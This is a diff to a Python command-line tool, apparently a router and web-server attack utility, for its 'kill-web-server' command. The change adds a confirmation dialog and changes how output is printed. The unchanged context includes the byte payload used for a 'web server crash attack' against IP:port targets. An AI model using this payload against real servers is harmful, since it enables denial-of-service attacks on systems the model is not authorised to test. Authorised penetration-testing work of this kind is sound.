@@ -10,10 +10,12 @@
 from typing import Annotated
 
 import requests
+import rich
 import typer
+from prompt_toolkit.shortcuts import yes_no_dialog
 from requests.exceptions import ConnectionError
-from rich import print
 
+from mkx.core.colors import BOLD, GREEN, RESET, YELLOW
 from mkx.core.helps import KILL_WEB_SERVER_HELP
 
 DATA = b'\x00\x00\x00\x00\x00\x00\x00\x00\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e'
@@ -55,19 +57,28 @@ def main(
 
     - mkx kill-web-server 172.16.0.123:80,172.16.0.124:80
     """
+    confirm = yes_no_dialog(
+        title='Confirm this action',
+        text='Do you want to perform a kill web server attack?',
+    ).run()
+
+    if not confirm:
+        print(f'{BOLD}{GREEN}[{RESET}{BOLD}{YELLOW}*{RESET}{BOLD}{GREEN}]{RESET} Aborting')
+        return
+
     target = target.split(',')
     http = 'http'
 
     if https:
         http = 'https'
 
-    print(
+    rich.print(
         '[bold red][[/bold red]'
         '[bold yellow]+[/bold yellow]'
         '[bold red]][/bold red]'
         ' Performing web server crash attack...'
     )
-    print(
+    rich.print(
         '[bold red][[/bold red]'
         '[bold yellow]+[/bold yellow]'
         '[bold red]][/bold red]'
